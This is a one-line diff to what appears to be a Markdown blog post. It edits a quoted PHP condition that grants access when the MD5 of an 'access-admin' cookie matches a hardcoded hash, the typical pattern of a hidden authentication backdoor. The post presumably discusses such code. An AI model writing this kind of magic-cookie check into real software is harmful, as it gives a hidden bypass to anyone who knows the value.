@@ -42,7 +42,7 @@ tags:
 > 
 
 > 
-> if(md5($_COOKIE['access-يوغرطة بن علي (Youghourta Benali)']) == "cf1afec15669cb96f09befb7d70f8bcb") {
+> if(md5($_COOKIE['access-admin']) == "cf1afec15669cb96f09befb7d70f8bcb") {
 > 
 > 
 
